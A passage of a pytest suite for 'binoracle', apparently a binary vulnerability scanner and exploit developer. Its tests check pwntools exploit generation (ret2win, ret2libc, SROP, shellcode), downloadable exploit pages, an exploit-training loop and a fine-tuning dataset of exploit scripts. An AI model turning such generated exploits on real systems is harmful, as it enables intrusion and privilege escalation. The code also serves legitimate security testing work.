    reg = _mock_reg(imports="sym.imp.strcmp\nsym.imp.socket\nsym.imp.recv",
                    strings="GNU C Library (Ubuntu) stable release version 2.23\n"
                            "enter password:\nadmin_token=abcd1234")
    # DA9: glibc 2.23 es antigua
    assert any("glibc 2.23" in f.title.lower() or "componente antiguo" in f.title.lower()
               for f in scan_versions(reg, "x"))
    # DA2: comparacion con credencial hardcodeada
    assert any("comparacion" in f.title.lower() or "comparison" in f.title.lower()
               for f in scan_auth(reg, "x"))
    # DA10: binario de red (recv) sin syslog -> logging insuficiente
    assert any("logging" in f.title.lower() or "registro" in f.title.lower()
               for f in scan_logging(reg, "x"))
    # DA10 conservador: binario no sensible no dispara
    assert scan_logging(_mock_reg(imports="sym.imp.printf"), "x") == []


def test_hardening_scanner():
    from binoracle.workflows.hardening import scan_hardening
    from binoracle.oracles.base import ToolResult

    class _T:
        def __init__(self, d, meta=None): self.d = d; self.meta = meta or {}
        def run(self): return ToolResult(True, "r", self.d, meta=self.meta)

    class _R:
        def __init__(self, cs, imp, st): self.cs = cs; self.imp = imp; self.st = st
        def get(self, n):
            if n == "r2_checksec": return _T("", self.cs)
            if n == "r2_imports": return _T(self.imp)
            if n == "r2_strings": return _T(self.st)
            return None

    # las strings van en formato de fila real de `izz` (offset/seccion/tipo + valor): string_values()
    # exige ese formato -- ver _mock_reg mas arriba, que hace lo mismo para los demas escaneres.
    st = ("0  0x0  0x0  10  10  .rodata  ascii  LD_PRELOAD\n"
          "1  0x0  0x0  2   2   .rodata  ascii  sh\n"
          "2  0x0  0x0  5   5   .rodata  ascii  ls -la")
    reg = _R({"nx": "false", "pic": "false", "canary": "false", "relro": "partial"},
             "sym.imp.setenv\nsym.imp.system", st)
    titles = " ".join(f.title.lower() for f in scan_hardening(reg, "x"))
    assert "endurecimiento" in titles          # build hardening insuficiente
    assert "ld_" in titles or "entorno" in titles   # LD_* env
    assert "path" in titles                    # ejecucion por PATH relativa
    # binario endurecido (todo ON) no dispara el de hardening
    reg2 = _R({"nx": "true", "pic": "true", "canary": "true", "relro": "full"}, "sym.imp.printf", "")
    assert not any("endurecimiento" in f.title.lower() for f in scan_hardening(reg2, "x"))


def test_injection_scanner():
    from binoracle.workflows.injection import scan_injection
    reg = _mock_reg(imports="sym.imp.sqlite3_exec\nsym.imp.sprintf\nsym.imp.recv\nsym.imp.system",
                    strings="SELECT * FROM users WHERE name='%s'")
    titles = " ".join(f.title.lower() for f in scan_injection(reg, "x"))
    assert "sql" in titles                     # SQLi por concatenacion
    assert "superficie de inyeccion" in titles  # entrada -> exec
    # parametrizado sin builders: no marca SQLi
    reg2 = _mock_reg(imports="sym.imp.sqlite3_prepare\nsym.imp.sqlite3_bind", strings="SELECT 1")
    assert not any("sql" in f.title.lower() for f in scan_injection(reg2, "x"))


def test_dataflow_hint_finds_shared_operand_between_source_and_sink():
    # Nivel de evidencia pedido explicito por el usuario ("no basta con la misma funcion, hay que
    # ir mas alla"): dataflow_hint busca, DENTRO de una funcion, si la llamada a la fuente y la
    # llamada al sink comparten un operando con nombre (variable de pila/registro) -- senal de que
    # el mismo valor fluye de uno a otro, mas fuerte que solo "ambas llamadas viven aqui".
    from binoracle.workflows._binfacts import dataflow_hint

    # patron real: read(fd, [var_58h], n) ... luego system([var_58h]) -- mismo buffer reutilizado
    body = (
        "0x1000  lea eax, [var_58h]\n"
        "0x1004  push eax\n"
        "0x1005  push 0x40\n"
        "0x1006  call sym.imp.read\n"
        "0x1010  lea eax, [var_58h]\n"
        "0x1014  push eax\n"
        "0x1015  call sym.imp.system\n"
    )
    hint = dataflow_hint(body, ["read"], ["system"])
    assert hint and hint["source"] == "read" and hint["sink"] == "system"
    assert hint["shared_operand"] == "var_58h"

    # sin operando compartido (buffers DISTINTOS, con distancia real entre ambas llamadas): no se
    # confirma, aunque ambas llamadas existan en la funcion.
    body_unrelated = (
        "0x1000  lea eax, [var_10h]\n"
        "0x1004  push eax\n"
        "0x1006  call sym.imp.read\n"
        "0x1008  mov ebx, 1\n"
        "0x100a  mov ecx, 2\n"
        "0x100c  mov edx, 3\n"
        "0x100e  nop\n"
        "0x1010  push str.fixed_cmd\n"
        "0x1015  call sym.imp.system\n"
    )
    assert dataflow_hint(body_unrelated, ["read"], ["system"]) is None

    # registros genericos (eax/esp/ebp) no cuentan como senal -- serian ruido universal
    body_generic_only = (
        "0x1000  call sym.imp.read\n"
        "0x1004  mov eax, eax\n"
        "0x1010  call sym.imp.system\n"
    )
    assert dataflow_hint(body_generic_only, ["read"], ["system"]) is None


def test_injection_scanner_distinguishes_dataflow_confirmed_from_same_function_only():
    # Verifica la integracion completa en scan_injection: cuando dataflow_confirmed() encuentra el
    # operando compartido, el titulo/severidad reflejan la confirmacion real (mas fuerte); cuando
    # solo se confirma la misma funcion (sin operando compartido), se mantiene el titulo honesto
    # anterior, pero YA citando la funcion real (antes location era el generico fijo).
    from unittest.mock import MagicMock
    from binoracle.workflows.injection import scan_injection

    def make_reg(disasm_body):
        reg = MagicMock()
        imports_tool = _mock_tool(data="1 0x1 GLOBAL FUNC recv\n2 0x2 GLOBAL FUNC system\n")
        strings_tool = _mock_tool(data="")

        class _Xrefs:
            def run(self, target=""):
                name = target.rsplit(".", 1)[-1] if target else ""
                if name in ("recv", "system"):
                    return MagicMock(ok=True, data=f"fcn.handle 0x1000 [CALL:--x] call sym.imp.{name}")
                return MagicMock(ok=True, data="")

        disasm_tool = _mock_tool(data=disasm_body)
        reg.get.side_effect = lambda n: {
            "r2_imports": imports_tool, "r2_strings": strings_tool,
            "r2_xrefs": _Xrefs(), "r2_disasm": disasm_tool,
        }.get(n)
        return reg

    # dataflow confirmado: mismo var_58h en recv() y en system()
    body_confirmed = (
        "0x1000  lea eax, [var_58h]\n0x1004  push eax\n0x1006  call sym.imp.recv\n"
        "0x1010  lea eax, [var_58h]\n0x1014  push eax\n0x1015  call sym.imp.system\n"
    )
    fs = scan_injection(make_reg(body_confirmed), "x", "es")
    f = next(f for f in fs if "inyeccion" in f.title.lower() and "sql" not in f.title.lower())
    assert "dataflow confirmado" in f.title.lower()
    assert f.severity == "high"
    assert f.location == "fcn.handle"
    assert "var_58h" in f.rationale

    # solo misma funcion, SIN operando compartido: titulo honesto anterior, pero cita la funcion real
    body_no_flow = "0x1000  call sym.imp.recv\n0x1010  push str.fixed\n0x1015  call sym.imp.system\n"
    fs2 = scan_injection(make_reg(body_no_flow), "x", "es")
    f2 = next(f for f in fs2 if "inyeccion" in f.title.lower() and "sql" not in f.title.lower())
    assert "dataflow" not in f2.title.lower()
    assert f2.severity == "medium"
    assert f2.location == "fcn.handle"
    assert "NO se pudo confirmar" in f2.rationale


def test_authz_scanner(tmp_path):
    import os
    from binoracle.workflows.authz import scan_authz
    p = tmp_path / "suidbin"
    p.write_bytes(b"\x7fELF")
    os.chmod(p, 0o4755)                         # SUID
    # SUID + exec sin drop -> privesc
    reg = _mock_reg(imports="sym.imp.system\nsym.imp.execl")
    assert any("sin soltar privilegios" in f.title.lower() for f in scan_authz(reg, str(p)))
    # SUID + exec + drop -> no marca el fuerte
    reg2 = _mock_reg(imports="sym.imp.system\nsym.imp.setresuid")
    assert not any("ejecuta comandos" in f.title.lower() for f in scan_authz(reg2, str(p)))
    # binario NO privilegiado -> no aplica
    q = tmp_path / "plain"; q.write_bytes(b"\x7fELF"); os.chmod(q, 0o755)
    assert scan_authz(_mock_reg(imports="sym.imp.system"), str(q)) == []


def test_cfg_block_state():
    from binoracle.workflows.cfg import _block_state, _state_note, _norm_reg
    # normalizacion de sub-registros a 64 bits
    assert _norm_reg("eax") == "rax" and _norm_reg("dil") == "rdi" and _norm_reg("r8d") == "r8"
    blk = [{"txt": "push rbp", "addr": "0x0"},
           {"txt": "mov rbp, rsp", "addr": "0x1"},
           {"txt": "sub rsp, 0x40", "addr": "0x2"},
           {"txt": "lea rax, [rbp-0x40]", "addr": "0x3"},
           {"txt": "mov edi, eax", "addr": "0x4"},
           {"txt": "call sym.imp.read", "addr": "0x5"}]
    st = _block_state(blk)
    assert st["delta"] == -8 - 0x40                 # push (-8) + sub rsp 0x40
    assert "rax" in st["w"] and "rdi" in st["w"]    # lea->rax, mov edi (rdi)
    assert "rbp" in st["r"]
    assert any("rbp-0x40" in s for s in st["slots"])
    assert "sym.imp.read" in st["calls"]
    note = _state_note(st, "es")
    assert "escribe" in note and "RSP" in note and "llama" in note


def test_trail_kind_classifier():
    from binoracle.report.html import _trail_kind
    assert _trail_kind("try_ret2win", "autopoc: sandbox", "uid=0(root)", "es")[0].startswith("ejecucion")
    assert "angr" in _trail_kind("x", "angr", "reachable", "es")[0]
    assert _trail_kind("dynamic_trace", "LD_PRELOAD", "connect", "es")[0] == "dinamica"
    assert _trail_kind("r2_sinks", "radare2: axt", "read", "es")[0] == "estatica"
    # cada tecnica tiene su color
    cols = {_trail_kind(*a, "es")[1] for a in [("t", "sandbox", "shell"), ("t", "angr", ""),
                                               ("t", "gdb", "stop reason"), ("t", "r2", "pdf")]}
    assert len(cols) == 4


def test_payload_layout():
    from binoracle.report.html import _le_bytes, _payload_layout_html
    assert _le_bytes("0x401156") == ["56", "11", "40", "00", "00", "00", "00", "00"]
    h = _payload_layout_html(72, "0x401156", "es")
    assert "paylay" in h and "p64(0x401156)" in h
    assert "0x48" in h                         # offset 72 en hex
    assert "56 11 40" in h                     # direccion en little-endian
    assert _payload_layout_html("N", "0x0", "es") == ""   # sin offset numerico -> vacio


def test_cve_exploit_plan():
    from binoracle.workflows.cveplan import classify_cve, plan, render_plan
    assert classify_cve("a stack-based buffer overflow allows RCE") == "stack-overflow"
    assert classify_cve("use-after-free in the handler") == "uaf"
    assert classify_cve("uncontrolled format string (%n)") == "format-string"
    assert classify_cve("nothing recognizable here") is None
    # plan de stack overflow con NX+PIE+canary -> fases de leak + control + ROP
    pl = plan("stack buffer overflow via strcpy", {"nx": True, "pie": True, "canary": True, "relro": "full"},
              cve="CVE-2024-1", lang="es")
    assert pl.vuln_class == "stack-overflow" and pl.cve == "CVE-2024-1"
    names = " ".join(ph.name.lower() for ph in pl.phases)
    assert "canary" in names and "pie" in names and "rop" in names and "objetivo" in names
    assert any("Full RELRO" in m for m in pl.mitigations)
    assert "ret2win" in pl.kb_refs
    md = render_plan(pl, "es")
    assert "Esquema de explotacion" in md and "Primitiva" in md
    # sin clase reconocida -> plan vacio con nota
    assert plan("blah blah", {}, lang="es").ok is False


def test_cveplan_script_from_proof():
    from binoracle.workflows.cveplan import _pwn_script_from_proof
    s = _pwn_script_from_proof({"strategy": "ret2win", "offset": 72, "win": "0x401156"}, "vuln")
    assert "OFFSET = 72" in s and "0x401156" in s and "from pwn import" in s and "./vuln" in s
    s2 = _pwn_script_from_proof({"strategy": "ret2libc+leak (2 etapas)", "offset": 88}, "b")
    assert "rop.puts(elf.got['puts'])" in s2 and "libc" in s2
    assert _pwn_script_from_proof({"strategy": "ret2win"}, "x").endswith("offset no resuelto")


def test_owasp_all_categories_covered():
    # Tras anadir DA2/DA9/DA10, las 10 categorias OWASP se examinan de verdad (covered=True)
    from binoracle.report.render import _OWASP_DESKTOP
    not_covered = [cid for cid, name, covered, kws in _OWASP_DESKTOP if not covered]
    assert not_covered == [], f"categorias sin scanner: {not_covered}"


def test_reachability_helpers():
    from binoracle.workflows.reachability import ReachResult, _EXEC_SINKS, _OVF_SINKS
    r = ReachResult(ok=True, target=0x401156, stdin=b"s3cr3t\n\x00\x00")
    assert r.stdin_hex.startswith("73336372")           # 's3cr'
    assert r.stdin_printable.startswith("s3cr3t")        # legible; nulos -> '.'
    assert "." in r.stdin_printable                       # bytes no imprimibles -> '.'
    # sinks de ejecucion priorizados y sin solaparse con los de overflow
    assert "system" in _EXEC_SINKS and "execve" in _EXEC_SINKS
    assert "gets" in _OVF_SINKS and "read" in _OVF_SINKS
    assert not (set(_EXEC_SINKS) & set(_OVF_SINKS))


def test_ingest_classify():
    # El clasificador de aprendizaje automatico: binario-RE se queda, web/routers fuera,
    # chino a traducir.
    from binoracle.ingest import classify
    arm = ("# AArch64 reversing\n## Workflow\nDisassemble the ELF with objdump, load it in "
           "Ghidra, trace the ROP gadget and the syscall boundary. Recover the struct layout "
           "and rename functions. Use frida to hook the native library at runtime.\n" * 3)
    assert classify("arm64-reversing/SKILL.md", arm)[0] == "keep"
    assert classify("vendor-cloudflare-turnstile/SKILL.md", "captcha bypass")[0] == "drop"
    assert classify("sqli-playbook.md",
                    "SQL injection via GraphQL and SSRF and JWT and XSS")[0] == "drop"
    assert classify("ida-reverse/SKILL.md",
                    "## ACTION REQUIRED\nNOW: run start.ps1\nhands off to orchestrator")[0] == "drop"
    assert classify("kctf/writeup.md", "这是一个逆向工程的题解 " * 20)[0] == "translate"
    assert classify("skills/README.md", "index of modules")[0] == "drop"


def test_rag_wires_in_tool_knowledge():
    # "Todo hilado": el catalogo de herramientas (toolcheck) esta en el RAG, no solo los
    # cheat sheets. Una consulta por una herramienta la recupera.
    from binoracle.toolcheck import tool_catalog
    kb = get_kb()
    tool_chunks = [c for c in kb.chunks if c.doc.startswith("tools/")]
    assert len(tool_chunks) == len(tool_catalog()), "faltan herramientas en el RAG"
    top = kb.retrieve("libc-database identify libc offsets from a leak", k=3)
    assert any(c.doc == "tools/libc-database" for c, _ in top), \
        "el saber-herramientas no se recupera"


def test_rag_excludes_readme_manifests():
    # Los README son indices de navegacion del corpus, no cheat sheets:
    # no deben indexarse ni aparecer en el desglose de fuentes.
    kb = get_kb()
    bad = {"readme", "skill", "index", "_index", "_template"}
    offenders = [c.doc for c in kb.chunks if c.doc.rsplit("/", 1)[-1].lower() in bad]
    assert not offenders, f"manifiestos/routers indexados como conocimiento: {offenders[:5]}"
    assert "README" not in kb.sources_summary()


def test_rag_index_has_no_duplicate_chunks():
    # El mismo tema aparece en varios corpus importados; el dedup exacto en _add debe evitar
    # que un chunk identico gaste un slot del top-k con contenido repetido.
    import collections
    kb = get_kb()
    seen = collections.Counter((c.title.strip(), c.text.strip()) for c in kb.chunks)
    dups = [t for (t, _), n in seen.items() if n > 1]
    assert not dups, f"chunks duplicados exactos en el indice: {dups[:5]}"


def test_rag_index_has_no_cjk_noise():
    # binoracle trabaja en ES/EN: ningun chunk debe quedar dominado por CJK (traducciones
    # parciales que dejaron titulos/terminos en chino).
    import re
    cjk = re.compile(r"[一-鿿]")
    kb = get_kb()
    noisy = [c.doc for c in kb.chunks
             if len(cjk.findall(c.title + c.text)) / max(len(c.title + c.text), 1) > 0.02]
    assert not noisy, f"chunks con CJK residual >2%: {noisy[:5]}"


def test_web_rag_command():
    from binoracle.web import run_command
    r = run_command({"command": "rag", "options": {"expand": 1}})
    assert r["ok"] and "rag" in r
    assert r["rag"]["expand"] is True
    run_command({"command": "rag", "options": {"expand": 0}})


def test_web_kb_library():
    from binoracle.web import run_command
    r = run_command({"command": "kb", "options": {}})
    assert r["ok"] and r.get("kind") == "library"
    html = r["html"]
    assert "Biblioteca" in html and "const DOCS=" in html
    # imported skills (subdirs) must NOT appear as browsable library ENTRIES (its id has no
    # "/"). El texto de un cheat sheet curado si puede mencionar "skills/" en su atribucion.
    assert '"id": "skills/' not in html


def test_web_tools_command():
    from binoracle.web import run_command
    r = run_command({"command": "tools", "options": {}})
    assert r["ok"] and "toolchain" in r["text"]


def test_cveplan_html_schema_and_verified_exploit():
    # El informe muestra el ESQUEMA de explotacion (clase -> primitiva -> concrecion -> fases ->
    # mitigaciones) y, si hay cadena verificada, la PRUEBA y el script pwntools desarrollado.
    from binoracle.workflows.cveplan import plan_from_analysis
    from binoracle.report.html import _cveplan_html

    class FakeChain:
        name = "ret2win"; verified = True; target = "win"
        proof = {"strategy": "ret2win", "offset": 72, "win": "0x401156", "output": "uid=0(root)"}

    class FakeAn:
        ok = True; target = "win"
        control = {"RIP": True, "rip_offset": 72,
                   "reg_gadgets": {"rdi": {"addr": "0x401234"}}, "pivot_gadget": None}
        gadgets = list(range(120)); chains = [FakeChain()]

    pl = plan_from_analysis(FakeAn(), {"nx": True, "pie": False, "canary": False, "relro": "partial"},
                            binary_name="vuln", lang="es")
    assert pl.ok and pl.vuln_class == "stack-overflow"
    assert pl.verified and pl.concrete.get("offset") == 72 and pl.script
    for lang in ("es", "en"):
        html = _cveplan_html(pl, lang)
        assert 'id="sec-exploitplan"' in html
        assert "0x401234" in html and "uid=0(root)" in html
        assert "pwntools" in html.lower()
        assert "—" not in html  # sin guiones largos
    # sin analisis reconocible -> sin seccion
    from binoracle.workflows.cveplan import ExploitPlan
    assert _cveplan_html(ExploitPlan(), "es") == ""


def test_report_embeds_exploit_plan_toc():
    # render_html enlaza la seccion en el indice solo cuando hay plan concreto (no crashea sin chains).
    from binoracle.report.html import render_html
    out = render_html("target.bin", findings=[], lang="es", chains=None)
    assert "sec-exploitplan" not in out  # sin chains, sin seccion


def test_history_delete_removes_scan():
    # Se puede borrar un binario del historial junto con sus hallazgos/facts/notas.
    import os, tempfile
    from binoracle.store.session import SessionStore, delete_binary, list_all_binaries, Finding
    d = tempfile.mkdtemp()
    b = os.path.join(d, "target.bin")
    with open(b, "wb") as fh:
        fh.write(b"\x7fELF" + os.urandom(200))
    db = os.path.join(d, "sess.db")
    s = SessionStore(db, b)
    s.add_finding(Finding(title="stack overflow", severity="high", verdict="verified",
                          evidence="[sandbox] uid=0", location="main"))
    s.add_fact("r2", "r2", "aaa ok")
    bid = s.bin_id
    s.close()
    assert len(list_all_binaries(db)) == 1
    res = delete_binary(db, bid)
    assert res["ok"] and res["deleted"]["binaries"] == 1 and res["deleted"]["findings"] == 1
    assert list_all_binaries(db) == []
    assert delete_binary(db, "deadbeef")["ok"] is False


def test_session_store_save_and_load_report_roundtrip():
    # save_report()/load_report(): el informe COMPLETO (no solo los findings sueltos) que
    # renderDash() consume, guardado tal cual para poder reabrirlo desde el historial sin
    # re-analizar. Un informe nuevo del mismo 'kind' REEMPLAZA al anterior (no se acumulan).
    import os, tempfile
    from binoracle.store.session import SessionStore
    d = tempfile.mkdtemp()
    b = os.path.join(d, "target.bin")
    with open(b, "wb") as fh:
        fh.write(b"\x7fELF" + os.urandom(200))
    db = os.path.join(d, "sess.db")
    s = SessionStore(db, b)
    assert s.load_report("dashboard") is None
    data1 = {"arch": "x86", "bits": "64", "findings": {"total": 1, "verified": 0, "by_sev": {}},
             "items": [{"title": "primero"}]}
    s.save_report("dashboard", data1)
    assert s.load_report("dashboard") == data1
    data2 = {"arch": "x86", "bits": "64", "findings": {"total": 2, "verified": 1, "by_sev": {}},
             "items": [{"title": "segundo"}]}
    s.save_report("dashboard", data2)
    loaded = s.load_report("dashboard")
    assert loaded == data2  # reemplaza, no acumula
    s.close()


def test_delete_binary_also_removes_stored_report():
    import os, tempfile
    from binoracle.store.session import SessionStore, delete_binary
    d = tempfile.mkdtemp()
    b = os.path.join(d, "target.bin")
    with open(b, "wb") as fh:
        fh.write(b"\x7fELF" + os.urandom(200))
    db = os.path.join(d, "sess.db")
    s = SessionStore(db, b)
    s.save_report("dashboard", {"findings": {"total": 0, "verified": 0, "by_sev": {}}, "items": []})
    bid = s.bin_id
    s.close()
    res = delete_binary(db, bid)
    assert res["ok"] and res["deleted"].get("reports") == 1
    s2 = SessionStore(db, b)
    assert s2.load_report("dashboard") is None
    s2.close()


def test_history_click_loads_stored_report_without_rescanning(monkeypatch, tmp_path):
    # El bug reportado: al hacer click en un binario del historial, la web volvia a
    # RE-ESCANEARLO (dash() -> stream('dashboard'), pipeline completo: triage+hunt+verify+
    # dynamic_trace) en vez de llevar al informe YA analizado. Ahora el frontend llama a
    # 'dashboard_stored', que debe: (a) si hay un informe guardado, emitirlo TAL CUAL con un
    # unico paso informativo y SIN disparar ninguna herramienta pesada; (b) si nunca se genero
    # ninguno, caer al analisis en vivo (unico caso donde SI se re-escanea).
    import os
    import binoracle.web as web
    from binoracle.store.session import SessionStore

    class _FakeConfig:
        def db_path(self):
            return str(tmp_path / "sess.db")
        lang = "es"

    monkeypatch.setattr(web, "load_config", lambda: _FakeConfig())

    b = str(tmp_path / "target.bin")
    with open(b, "wb") as fh:
        fh.write(b"\x7fELF" + os.urandom(200))

    stored = {"arch": "x86", "bits": "64", "format": "elf",
              "mitigations": {"NX": True}, "findings": {"total": 3, "verified": 1, "by_sev": {}},
              "items": [{"title": "cacheado"}], "sinks": [], "functions": 0, "sink_detail": ""}
    s = SessionStore(_FakeConfig().db_path(), b)
    s.save_report("dashboard", stored)
    s.close()

    events = []
    web.run_streaming("dashboard_stored", b, False, lambda kind, data: events.append((kind, data)))
    kinds = [k for k, _ in events]
    assert kinds == ["step", "dashboard", "done"]
    assert events[1][1] == stored
    # nada de pasos de la tuberia pesada (serian visibles como mensajes de "step" adicionales)
    steps = [d for k, d in events if k == "step"]
    assert not any("hunt" in s.lower() or "sinks y vulnerabilidades" in s.lower() for s in steps)


def test_web_history_delete_command():
    from binoracle.web import run_command
    r = run_command({"command": "history_delete", "options": {"bin_id": ""}})
    assert r["ok"] is False  # bin_id vacio -> no borra
    assert "history" in r  # aun asi devuelve el historial actualizado


def test_web_history_multiselect_delete(tmp_path, monkeypatch):
    # Papelera: seleccion multiple -> borra varios binarios del historial de una vez.
    import binoracle.web as web
    from binoracle.store.session import SessionStore, Finding
    db = str(tmp_path / "s.db")
    ids = []
    for nm in ("a.bin", "b.bin", "c.bin"):
        p = str(tmp_path / nm)
        with open(p, "wb") as fh:
            fh.write(b"\x7fELF" + (nm.encode() * 20))
        s = SessionStore(db, p)
        s.add_finding(Finding(title="t", severity="low", verdict="grounded",
                              evidence="e", location=nm))
        ids.append(s.bin_id)
        s.close()

    class Cfg:
        lang = "es"
        def db_path(self):
            return db
    monkeypatch.setattr(web, "load_config", lambda: Cfg())
    assert len(web.run_command({"command": "history", "options": {}})["history"]) == 3
    r = web.run_command({"command": "history_delete", "options": {"bin_ids": ids[:2]}})
    assert r["ok"] and r["deleted_count"] == 2 and len(r["history"]) == 1
    # seleccion vacia no borra nada
    assert web.run_command({"command": "history_delete", "options": {"bin_ids": []}})["ok"] is False


def test_cveplan_exports_developed_exploit(tmp_path, capsys):
    # binoracle DESARROLLA el exploit: --out escribe un script pwntools ejecutable, anclado a la
    # cadena verificada. Aqui forzamos un plan con script y comprobamos la exportacion.
    import os, types
    from binoracle import cli
    from binoracle.workflows import cveplan as CV
    pl = CV.ExploitPlan(vuln_class="stack-overflow", primitive="RIP", verified=True)
    pl.proof = {"strategy": "ret2win", "offset": 72, "win": "0x401156"}
    pl.script = CV._pwn_script_from_proof(pl.proof, "vuln")
    orig = CV.plan_for_binary
    CV.plan_for_binary = lambda *a, **k: pl
    try:
        out = str(tmp_path / "exploit.py")
        cfg = types.SimpleNamespace(lang="es")
        args = types.SimpleNamespace(binary="./vuln", text="stack overflow", cve="",
                                     no_verify=False, out=out)
        cli.cmd_cveplan(args, cfg)
    finally:
        CV.plan_for_binary = orig
    assert os.path.exists(out)
    assert os.stat(out).st_mode & 0o111  # ejecutable
    body = open(out).read()
    assert "from pwn import *" in body and "OFFSET = 72" in body


def test_render_exploit_page_functional_section():
    # Apartado CVE -> exploit funcional: pagina autocontenida con esquema, estado verificado y el
    # exploit desarrollado descargable (data URI del script pwntools).
    from binoracle.report.html import render_exploit_page
    from binoracle.workflows.cveplan import ExploitPlan, _pwn_script_from_proof
    pl = ExploitPlan(vuln_class="stack-overflow", primitive="control de RIP", verified=True,
                     kb_refs=["ret2win", "rop"])
    pl.concrete = {"offset": 72, "reg_gadgets": {"rdi": "0x401234"}, "target": "win",
                   "gadgets_total": 150, "chain": "ret2win"}
    pl.proof = {"strategy": "ret2win", "offset": 72, "win": "0x401156", "output": "uid=0(root)"}
    pl.script = _pwn_script_from_proof(pl.proof, "vuln")
    for lang in ("es", "en"):
        pg = render_exploit_page(pl, "/tmp/vuln", lang)
        assert "<!doctype html>" in pg
        assert 'class="dlbtn"' in pg and "data:text/x-python;base64," in pg
        assert "sec-exploitplan" in pg and "uid=0(root)" in pg
        assert "—" not in pg  # sin em-dash
    # plan no reconocido -> pagina de guia, sin el boton de descarga (el anchor, no la clase CSS)
    bad = render_exploit_page(ExploitPlan(note="clase no reconocida"), "/tmp/vuln", "es")
    assert "No se pudo derivar" in bad and 'class="dlbtn"' not in bad


def test_develop_exploit_all_classes_compile():
    # El desarrollador de exploits produce un script pwntools que COMPILA para cada clase.
    from binoracle.workflows.cveplan import plan
    import ast
    classes = {"stack buffer overflow": "stack-overflow", "format string": "format-string",
               "heap overflow": "heap-overflow", "use-after-free": "uaf", "double free": "double-free",
               "out-of-bounds write": "oob-write", "integer overflow": "integer-overflow",
               "type confusion": "type-confusion"}
    for text, expect in classes.items():
        pl = plan(text, {"nx": True, "pie": False, "canary": False})
        assert pl.vuln_class == expect
        assert pl.script and "from pwn import *" in pl.script
        compile(pl.script, "<exploit>", "exec")  # sintaxis valida
    # NX desactivado -> ret2shellcode
    assert "shellcraft" in plan("stack buffer overflow", {"nx": False}).script
    # SROP disponible como estrategia (D) para stack-overflow estatico/minimo
    so = plan("stack buffer overflow", {"nx": True, "pie": False}).script
    assert "SigreturnFrame" in so and "SYS_execve" in so
    # one-gadget ofrecido en la ruta de heap (tras resolver la base de libc)
    assert "one_gadget" in plan("heap overflow", {"nx": True}).script


def test_default_corpus_is_elf_only():
    # El corpus de entrenamiento son ELF ejecutables/PIE reales: sin PE (.exe) ni core dumps.
    from binoracle.workflows.exploit_trainer import default_corpus, _is_elf
    corpus = default_corpus()
    assert corpus, "el corpus de ejemplo no deberia estar vacio"
    assert all(_is_elf(p) for p in corpus)
    names = [p.rsplit("/", 1)[-1] for p in corpus]
    assert "srop" in names            # objetivo SROP
    assert not any(n.endswith(".exe") or n == "core" for n in names)
    # el corpus ampliado cubre clases variadas (heap, format-string, oob, integer, uaf, canary)
    for expected in ("canary", "fmt_got", "uaf", "intoverflow", "oobwrite", "notes_heap", "staticrop"):
        assert expected in names, f"falta {expected} en el corpus"
    assert len(corpus) >= 18


def test_exploit_skill_accumulates(tmp_path):
    # La tabla de habilidad acumula intentos/exitos entre ejecuciones (progreso medible).
    from binoracle.store.session import SessionStore, read_exploit_skill
    db = str(tmp_path / "s.db")
    b = str(tmp_path / "t.bin")
    with open(b, "wb") as fh:
        fh.write(b"\x7fELF" + b"Z" * 200)
    s = SessionStore(db, b)
    s.record_exploit_attempt("x86", "stack-overflow", "ret2win", True, 72)
    s.record_exploit_attempt("x86", "stack-overflow", "ret2win", False, None)
    s.record_exploit_attempt("x86", "stack-overflow", "template", False, 552)
    s.close()
    sk = {(r["arch"], r["cls"], r["strategy"]): r for r in read_exploit_skill(db)}
    assert sk[("x86", "stack-overflow", "ret2win")]["attempts"] == 2
    assert sk[("x86", "stack-overflow", "ret2win")]["successes"] == 1
    assert abs(sk[("x86", "stack-overflow", "ret2win")]["rate"] - 0.5) < 1e-9
    assert sk[("x86", "stack-overflow", "template")]["successes"] == 0


def test_trainer_report_renders():
    from binoracle.workflows.exploit_trainer import TrainingReport, TrainCase, render_training
    rep = TrainingReport(attempted=2, verified=1, learned=1, seconds=1.0,
                         per_class={"stack-overflow": {"attempted": 2, "verified": 1}},
                         cases=[TrainCase(binary="a", name="ret2win", vuln_class="stack-overflow",
                                          strategy="ret2win", verified=True, offset=72)])
    md = render_training(rep, "es")
    assert "Entrenamiento" in md and "ret2win" in md and "50%" in md
    assert "—" not in md


def test_cve_id_detection_and_classifier_cooccurrence():
    from binoracle.workflows.cvelookup import is_cve_id
    from binoracle.workflows.cveplan import classify_cve
    assert is_cve_id("mira CVE-2021-3156 sudo") == "CVE-2021-3156"
    assert is_cve_id("stack overflow") is None
    # la clasificacion cae al respaldo por co-ocurrencia con la redaccion real de la NVD
    assert classify_cve("an off-by-one leading to a heap-based buffer overflow") == "heap-overflow"
    assert classify_cve("stack-based buffer overflow in parser") == "stack-overflow"
    assert classify_cve("a use after free in the handler") == "uaf"


def test_render_cve_info_gap_vs_public():
    from binoracle.workflows.cvelookup import CVEInfo, ExploitRef, render_cve_info
    gap = CVEInfo(cve_id="CVE-2099-0001", ok=True, description="heap overflow in x",
                  cvss_score=9.8, cvss_severity="CRITICAL")
    md = render_cve_info(gap, "es")
    assert "NO consta" in md and "CVE-2099-0001" in md
    pub = CVEInfo(cve_id="CVE-2099-0002", ok=True, description="stack overflow", has_public_exploit=True,
                  exploit_refs=[ExploitRef(url="https://www.exploit-db.com/exploits/12345",
                                           source="exploit-db", edb_id="12345")])
    md2 = render_cve_info(pub, "es")
    assert "SI consta" in md2 and "EDB-12345" in md2


def test_sft_sample_chat_format():
    from binoracle.workflows.exploit_dataset import Sample
    s = Sample(cls="stack-overflow", arch="x86", facts={"nx": "true", "pie": False, "bits": "64"},
               script="from pwn import *\nio=process('./t')", verified=True, binary="/x/ret2win")
    chat = s.to_chat()
    roles = [m["role"] for m in chat["messages"]]
    assert roles == ["system", "user", "assistant"]
    assert "NX=on" in chat["messages"][1]["content"] and "PIE=off" in chat["messages"][1]["content"]
    assert chat["messages"][2]["content"].startswith("from pwn import *")
    assert chat["meta"]["verified"] is True and chat["meta"]["binary"] == "ret2win"


def test_classify_binary_by_indicators():
    # Clasificacion por el binario: format-string (printf con formato variable) vs heap (UAF) vs
    # stack (gets/strcpy). Los que no dan senal concluyente quedan None (decide el control de RIP).
    from binoracle.workflows.cveplan import classify_binary
    import os
    cases = {"fmt_got": "format-string", "fmtstring": "format-string",
             "uaf": "uaf", "notes_heap": "uaf", "heapbug": ("heap-overflow", "uaf"),
             "ret2win": "stack-overflow", "ret2libc": None, "oobwrite": None,
             "srop": None, "canary": None}
    for name, expect in cases.items():
        p = f"samples/bin/{name}"
        if not os.path.exists(p):
            continue          # corpus se construye con samples/build.sh; no falla si no esta
